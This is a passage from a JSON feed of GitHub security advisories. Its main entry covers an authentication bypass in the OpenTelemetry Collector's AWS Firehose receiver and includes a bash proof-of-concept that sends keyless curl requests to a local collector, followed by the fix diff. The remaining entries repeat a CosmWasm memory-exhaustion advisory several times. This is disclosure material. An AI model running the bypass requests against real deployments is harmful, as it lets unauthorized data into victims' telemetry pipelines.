support private HTTP endpoints</a>.</p>\n<h3 id=\"fix\">Fix</h3>\n<p>A fix was introduced in <a href=\"https://github.com/open-telemetry/opentelemetry-collector-contrib/pull/34847\">https://github.com/open-telemetry/opentelemetry-collector-contrib/pull/34847</a> and released with v0.108.0 (<a href=\"https://github.com/open-telemetry/opentelemetry-collector-releases/releases/tag/v0.108.0\">https://github.com/open-telemetry/opentelemetry-collector-releases/releases/tag/v0.108.0</a>).</p>\n<h3 id=\"details\">Details</h3>\n<details>\n  <summary>Details</summary>\n\n<h4 id=\"poc\">PoC</h4>\n<p>When simulating Firehose requests against vulnerable versions of the Collector, we can see “UNAUTHORIZED METRICS” printed to the console via the debug exporter.\n(Note this script doesn’t run on some older still-vulnerable versions that do not have the “debug” exporter.)</p>\n<pre><code class=\"language-shell\">#!/bin/bash\n\nOTELCOL_VERSION=0.107.0\nOTELCOL_BINARY=\"otelcol-contrib-${OTELCOL_VERSION}\"\nOTELCOL_PLATFORM=\"linux_amd64\"\nHOST_PORT=8081\n\ncat &gt; config.yaml &lt;&lt; END\n# https://opentelemetry.io/docs/collector/configuration/\nexporters:\n  debug:\n    verbosity: normal\nreceivers:\n  awsfirehose:\n    endpoint : \"127.0.0.1:${HOST_PORT}\"\n    record_type : \"cwmetrics\"\n    access_key : \"1234\"\nservice:\n  pipelines:\n    metrics:\n      receivers:\n      - awsfirehose\n      exporters:\n      - debug\n  telemetry:\n    logs:\n      encoding: \"json\"\n      level: \"debug\"\nEND\n\n\nif [ ! -x \"${OTELCOL_BINARY}\" ]; then\n    curl --proto '=https' --tlsv1.2 -fOL https://github.com/open-telemetry/opentelemetry-collector-releases/releases/download/v${OTELCOL_VERSION}/otelcol-contrib_${OTELCOL_VERSION}_${OTELCOL_PLATFORM}.tar.gz\n    tar -xvf otelcol-contrib_${OTELCOL_VERSION}_${OTELCOL_PLATFORM}.tar.gz otelcol-contrib\n    mv otelcol-contrib ${OTELCOL_BINARY}\nfi\n\n\"./${OTELCOL_BINARY}\" --config=config.yaml &amp;\nOTELCOL_PID=$!\n\necho \"Running OTel Collector with PID ${OTELCOL_PID}\"\n\nsleep 3\n\n# Send metrics with correct access key\nif ! curl --fail \\\n  -H \"Content-Type: application/json\"\\\n  -H \"X-Amz-Firehose-Request-Id: requestId-valid\"\\\n  -H \"X-Amz-Firehose-Access-Key: 1234\"\\\n  --data '{\"requestId\":\"requestId-valid\",\"timestamp\":1723704887152,\"records\":[{\"data\":\"eyJtZXRyaWNfc3RyZWFtX25hbWUiOiJ0ZXN0IiwiYWNjb3VudF9pZCI6IjEyMzQ1Njc4OSIsInJlZ2lvbiI6InVzLWVhc3QtMSIsIm5hbWVzcGFjZSI6IkFXUy9DbG91ZEZyb250IiwibWV0cmljX25hbWUiOiJSZXF1ZXN0cyIsImRpbWVuc2lvbnMiOnsiRGlzdHJpYnV0aW9uSWQiOiJBQkNEIiwiUmVnaW9uIjoiR2xvYmFsIn0sInRpbWVzdGFtcCI6MTcyMzcwNDU0MDAwMCwidmFsdWUiOnsibWF4IjoxLjAsIm1pbiI6MS4wLCJzdW0iOjkuMCwiY291bnQiOjkuMH0sInVuaXQiOiJOb25lIn0=\"}]}'\\\n  http://127.0.0.1:${HOST_PORT}\nthen\n    echo \"Unexpected – Request with valid access key did not succeed\"\n    kill ${OTELCOL_PID}\n    exit 1\nfi\n\n# Send metrics with incorrect access key\nif curl --fail \\\n  -H \"Content-Type: application/json\"\\\n  -H \"X-Amz-Firehose-Request-Id: requestId-invalid\"\\\n  -H \"X-Amz-Firehose-Access-Key: 5678\"\\\n  --data '{\"requestId\":\"requestId-invalid\",\"timestamp\":1723704887152,\"records\":[{\"data\":\"eyJtZXRyaWNfc3RyZWFtX25hbWUiOiJ0ZXN0IiwiYWNjb3VudF9pZCI6IjEyMzQ1Njc4OSIsInJlZ2lvbiI6InVzLWVhc3QtMSIsIm5hbWVzcGFjZSI6IkFXUy9DbG91ZEZyb250IiwibWV0cmljX25hbWUiOiJVTkFVVEhPUklaRUQgTUVUUklDUyIsImRpbWVuc2lvbnMiOnsiRGlzdHJpYnV0aW9uSWQiOiJBQkNEIiwiUmVnaW9uIjoiR2xvYmFsIn0sInRpbWVzdGFtcCI6MTcyMzcwNDU0MDAwMCwidmFsdWUiOnsibWF4IjoxLjAsIm1pbiI6MS4wLCJzdW0iOjU2NzguMCwiY291bnQiOjU2NzguMH0sInVuaXQiOiJOb25lIn0=\"}]}'\\\n  http://127.0.0.1:${HOST_PORT}\nthen\n    echo \"Unexpected – Request succeeded with invalid access key\"\n    kill ${OTELCOL_PID}\n    exit 1\nfi\n\n# Send unauthorized metrics without an access key\nif curl --fail \\\n  -H \"Content-Type: application/json\"\\\n  -H \"X-Amz-Firehose-Request-Id: requestId-unauthorized\"\\\n  --data '{\"requestId\":\"requestId-unauthorized\",\"timestamp\":1723704887152,\"records\":[{\"data\":\"eyJtZXRyaWNfc3RyZWFtX25hbWUiOiJ0ZXN0IiwiYWNjb3VudF9pZCI6IjEyMzQ1Njc4OSIsInJlZ2lvbiI6InVzLWVhc3QtMSIsIm5hbWVzcGFjZSI6IkFXUy9DbG91ZEZyb250IiwibWV0cmljX25hbWUiOiJVTkFVVEhPUklaRUQgTUVUUklDUyIsImRpbWVuc2lvbnMiOnsiRGlzdHJpYnV0aW9uSWQiOiJBQkNEIiwiUmVnaW9uIjoiR2xvYmFsIn0sInRpbWVzdGFtcCI6MTcyMzcwNDU0MDAwMCwidmFsdWUiOnsibWF4IjoxLjAsIm1pbiI6MS4wLCJzdW0iOjU2NzguMCwiY291bnQiOjU2NzguMH0sInVuaXQiOiJOb25lIn0=\"}]}'\\\n  http://127.0.0.1:${HOST_PORT}\nthen\n    echo -e \"\\n*** Vulnerability present - request with no access key succeeded ***\\n\"\nelse\n    echo \"Not vulnerable - request with no key was denied.\"\n    kill ${OTELCOL_PID}\n    exit 1\nfi\n\nkill ${OTELCOL_PID}\n</code></pre>\n<h4 id=\"patch\">Patch</h4>\n<p>The <a href=\"https://github.com/open-telemetry/opentelemetry-collector-contrib/blob/v0.107.0/receiver/awsfirehosereceiver/receiver.go#L235\"><code>if</code> statement</a> makes the access key header optional, rather than the configuration optional.</p>\n<p>This has been patched in #34847 to separately handle the case where access_key is not configured, and use a default-deny style:</p>\n<pre><code class=\"language-diff\">diff --git a/receiver/awsfirehosereceiver/receiver.go b/receiver/awsfirehosereceiver/receiver.go\nindex 6211f61221..4d78eb2778 100644\n--- a/receiver/awsfirehosereceiver/receiver.go\n+++ b/receiver/awsfirehosereceiver/receiver.go\n@@ -233,10 +233,14 @@ func (fmr *firehoseReceiver) ServeHTTP(w http.ResponseWriter, r *http.Request) {\n // validate checks the Firehose access key in the header against\n // the one passed into the Config\n func (fmr *firehoseReceiver) validate(r *http.Request) (int, error) {\n-       if accessKey := r.Header.Get(headerFirehoseAccessKey); accessKey != \"\" &amp;&amp; accessKey != string(fmr.config.AccessKey) {\n-               return http.StatusUnauthorized, errInvalidAccessKey\n+       if string(fmr.config.AccessKey) == \"\" {\n+               // No access key is configured - accept all requests.\n+               return http.StatusAccepted, nil\n+       }\n+       if accessKey := r.Header.Get(headerFirehoseAccessKey); accessKey == string(fmr.config.AccessKey) {\n+               return http.StatusAccepted, nil\n        }\n-       return http.StatusAccepted, nil\n+       return http.StatusUnauthorized, errInvalidAccessKey\n }\n\ndiff --git a/receiver/awsfirehosereceiver/receiver_test.go b/receiver/awsfirehosereceiver/receiver_test.go\nindex b02a391dd5..1ef5bdf4d3 100644\n--- a/receiver/awsfirehosereceiver/receiver_test.go\n+++ b/receiver/awsfirehosereceiver/receiver_test.go\n@@ -123,6 +123,14 @@ func TestFirehoseRequest(t *testing.T) {\n                        wantStatusCode: http.StatusUnauthorized,\n                        wantErr:        errInvalidAccessKey,\n                },\n+               \"WithNoAccessKey\": {\n+                       headers: map[string]string{\n+                               headerFirehoseAccessKey: \"\",\n+                       },\n+                       body:           testFirehoseRequest(testFirehoseRequestID, noRecords),\n+                       wantStatusCode: http.StatusUnauthorized,\n+                       wantErr:        errInvalidAccessKey,\n+               },\n                \"WithoutRequestId/Body\": {\n                        headers: map[string]string{\n                                headerFirehoseRequestID: testFirehoseRequestID,\n</code></pre>\n</details>\n### References\n\n<ul>\n<li><a href=\"https://github.com/open-telemetry/opentelemetry-collector-contrib/security/advisories/GHSA-prf6-xjxh-p698\">https://github.com/open-telemetry/opentelemetry-collector-contrib/security/advisories/GHSA-prf6-xjxh-p698</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2024-45043\">https://nvd.nist.gov/vuln/detail/CVE-2024-45043</a></li>\n<li><a href=\"https://github.com/open-telemetry/opentelemetry-collector-contrib/pull/34847\">https://github.com/open-telemetry/opentelemetry-collector-contrib/pull/34847</a></li>\n<li><a href=\"https://github.com/open-telemetry/opentelemetry-collector-releases/pull/74\">https://github.com/open-telemetry/opentelemetry-collector-releases/pull/74</a></li>\n<li><a href=\"https://github.com/open-telemetry/opentelemetry-collector-contrib/commit/371bf6afbd7cfa3253fa1674f5444064e86ef0ac\">https://github.com/open-telemetry/opentelemetry-collector-contrib/commit/371bf6afbd7cfa3253fa1674f5444064e86ef0ac</a></li>\n<li><a href=\"https://docs.aws.amazon.com/firehose/latest/dev/controlling-access.html#using-iam-http\">https://docs.aws.amazon.com/firehose/latest/dev/controlling-access.html#using-iam-http</a></li>\n<li><a href=\"https://docs.aws.amazon.com/firehose/latest/dev/httpdeliveryrequestresponse.html\">https://docs.aws.amazon.com/firehose/latest/dev/httpdeliveryrequestresponse.html</a></li>\n<li><a href=\"https://github.com/open-telemetry/opentelemetry-collector#alpha\">https://github.com/open-telemetry/opentelemetry-collector#alpha</a></li>\n<li><a href=\"https://github.com/open-telemetry/opentelemetry-collector-contrib/tree/main/receiver/awsfirehosereceiver\">https://github.com/open-telemetry/opentelemetry-collector-contrib/tree/main/receiver/awsfirehosereceiver</a></li>\n<li><a href=\"https://github.com/open-telemetry/opentelemetry-collector-releases/releases/tag/v0.108.0\">https://github.com/open-telemetry/opentelemetry-collector-releases/releases/tag/v0.108.0</a></li>\n<li><a href=\"https://github.com/open-telemetry/opentelemetry-collector-releases/tree/main/distributions/otelcol-contrib\">https://github.com/open-telemetry/opentelemetry-collector-releases/tree/main/distributions/otelcol-contrib</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-prf6-xjxh-p698\">https://github.com/advisories/GHSA-prf6-xjxh-p698</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-prf6-xjxh-p698",
            "title": "[github.com/open-telemetry/opentelemetry-collector-contrib/receiver/awsfirehosereceiver] OpenTelemetry Collector module AWS Firehose Receiver Authentication Bypass Vulnerability",
            "date_modified": "2024-08-29T17:56:37.000Z",
            "date_published": "2024-08-29T17:56:36.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-prf6-xjxh-p698"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>A specifically crafted Wasm file can cause the VM to consume excessive amounts of memory when compiling a contract.\nThis can lead to high memory usage, slowdowns, potentially a crash and can poison a lock in the VM,\npreventing any further interaction with contracts.</p>\n<p>For more information, see <a href=\"https://github.com/CosmWasm/advisories/blob/main/CWAs/CWA-2023-004.md\">CWA-2023-004</a>.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://forum.cosmos.network/t/high-severity-security-patch-upcoming-on-wed-10th-cwa-2023-004-brought-to-you-by-certik-and-confio/12840\">https://forum.cosmos.network/t/high-severity-security-patch-upcoming-on-wed-10th-cwa-2023-004-brought-to-you-by-certik-and-confio/12840</a></li>\n<li><a href=\"https://github.com/CosmWasm/advisories/blob/main/CWAs/CWA-2023-004.md\">https://github.com/CosmWasm/advisories/blob/main/CWAs/CWA-2023-004.md</a></li>\n<li><a href=\"https://rustsec.org/advisories/RUSTSEC-2024-0366.html\">https://rustsec.org/advisories/RUSTSEC-2024-0366.html</a></li>\n<li><a href=\"https://www.certik.com/resources/blog/risk-and-security-enhancement-for-app-chains-an-in-depth-writeup-of-cwa-2023\">https://www.certik.com/resources/blog/risk-and-security-enhancement-for-app-chains-an-in-depth-writeup-of-cwa-2023</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-75qh-gg76-p2w4\">https://github.com/advisories/GHSA-75qh-gg76-p2w4</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-75qh-gg76-p2w4",
            "title": "[github.com/CosmWasm/wasmvm] CWA-2023-004: Excessive number of function parameters in compiled Wasm",
            "date_modified": "2024-08-27T19:55:41.000Z",
            "date_published": "2024-08-27T19:55:40.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-75qh-gg76-p2w4"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>A specifically crafted Wasm file can cause the VM to consume excessive amounts of memory when compiling a contract.\nThis can lead to high memory usage, slowdowns, potentially a crash and can poison a lock in the VM,\npreventing any further interaction with contracts.</p>\n<p>For more information, see <a href=\"https://github.com/CosmWasm/advisories/blob/main/CWAs/CWA-2023-004.md\">CWA-2023-004</a>.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://forum.cosmos.network/t/high-severity-security-patch-upcoming-on-wed-10th-cwa-2023-004-brought-to-you-by-certik-and-confio/12840\">https://forum.cosmos.network/t/high-severity-security-patch-upcoming-on-wed-10th-cwa-2023-004-brought-to-you-by-certik-and-confio/12840</a></li>\n<li><a href=\"https://github.com/CosmWasm/advisories/blob/main/CWAs/CWA-2023-004.md\">https://github.com/CosmWasm/advisories/blob/main/CWAs/CWA-2023-004.md</a></li>\n<li><a href=\"https://rustsec.org/advisories/RUSTSEC-2024-0366.html\">https://rustsec.org/advisories/RUSTSEC-2024-0366.html</a></li>\n<li><a href=\"https://www.certik.com/resources/blog/risk-and-security-enhancement-for-app-chains-an-in-depth-writeup-of-cwa-2023\">https://www.certik.com/resources/blog/risk-and-security-enhancement-for-app-chains-an-in-depth-writeup-of-cwa-2023</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-75qh-gg76-p2w4\">https://github.com/advisories/GHSA-75qh-gg76-p2w4</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-75qh-gg76-p2w4",
            "title": "[github.com/CosmWasm/wasmvm] CWA-2023-004: Excessive number of function parameters in compiled Wasm",
            "date_modified": "2024-08-27T19:55:41.000Z",
            "date_published": "2024-08-27T19:55:40.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-75qh-gg76-p2w4"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>A specifically crafted Wasm file can cause the VM to consume excessive amounts of memory when compiling a contract.\nThis can lead to high memory usage, slowdowns, potentially a crash and can poison a lock in the VM,\npreventing any further interaction with contracts.</p>\n<p>For more information, see <a href=\"https://github.com/CosmWasm/advisories/blob/main/CWAs/CWA-2023-004.md\">CWA-2023-004</a>.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://forum.cosmos.network/t/high-severity-security-patch-upcoming-on-wed-10th-cwa-2023-004-brought-to-you-by-certik-and-confio/12840\">https://forum.cosmos.network/t/high-severity-security-patch-upcoming-on-wed-10th-cwa-2023-004-brought-to-you-by-certik-and-confio/12840</a></li>\n<li><a href=\"https://github.com/CosmWasm/advisories/blob/main/CWAs/CWA-2023-004.md\">https://github.com/CosmWasm/advisories/blob/main/CWAs/CWA-2023-004.md</a></li>\n<li><a href=\"https://rustsec.org/advisories/RUSTSEC-2024-0366.html\">https://rustsec.org/advisories/RUSTSEC-2024-0366.html</a></li>\n<li><a href=\"https://www.certik.com/resources/blog/risk-and-security-enhancement-for-app-chains-an-in-depth-writeup-of-cwa-2023\">https://www.certik.com/resources/blog/risk-and-security-enhancement-for-app-chains-an-in-depth-writeup-of-cwa-2023</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-75qh-gg76-p2w4\">https://github.com/advisories/GHSA-75qh-gg76-p2w4</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-75qh-gg76-p2w4",
            "title": "[github.com/CosmWasm/wasmvm] CWA-2023-004: Excessive number of function parameters in compiled Wasm",
            "date_modified": "2024-08-27T19:55:41.000Z",
            "date_published": "2024-08-27T19:55:40.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-75qh-gg76-p2w4"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>A specifically crafted Wasm file can cause the VM to consume excessive amounts of memory when compiling a contract.\nThis can lead to high memory usage, slowdowns, potentially a crash and can poison a lock in the VM,\npreventing any further interaction with contracts.</p>\n<p>For more information, see <a href=\"https://github.com/CosmWasm/advisories/blob/main/CWAs/CWA-2023-004.md\">CWA-2023-004</a>.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://forum.cosmos.network/t/high-severity-security-patch-upcoming-on-wed-10th-cwa-2023-004-brought-to-you-by-certik-and-confio/12840\">https://forum.cosmos.network/t/high-severity-security-patch-upcoming-on-wed-10th-cwa-2023-004-brought-to-you-by-certik-and-confio/12840</a></li>\n<li><a href=\"https://github.com/CosmWasm/advisories/blob/main/CWAs/CWA-2023-004.md\">https://github.com/CosmWasm/advisories/blob/main/CWAs/CWA-2023-004.md</a></li>\n<li><a href=\"https://rustsec.org/advisories/RUSTSEC-2024-0366.html\">https://rustsec.org/advisories/RUSTSEC-2024-0366.html</a></li>\n<li><a href=\"https://www.certik.com/resources/blog/risk-and-security-enhancement-for-app-chains-an-in-depth-writeup-of-cwa-2023\">https://www.certik.com/resources/blog/risk-and-security-enhancement-for-app-chains-an-in-depth-writeup-of-cwa-2023</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-75qh-gg76-p2w4\">https://github.com/advisories/GHSA-75qh-gg76-p2w4</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-75qh-gg76-p2w4",
            "title": "[github.com/CosmWasm/wasmvm] CWA-2023-004: Excessive number of function parameters in compiled Wasm",
            "date_modified": "2024-08-27T19:55:41.000Z",
            "date_published": "2024-08-27T19:55:40.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-75qh-gg76-p2w4"
            },
            "tags": [
                "severity"
            ]
        }
    ]
}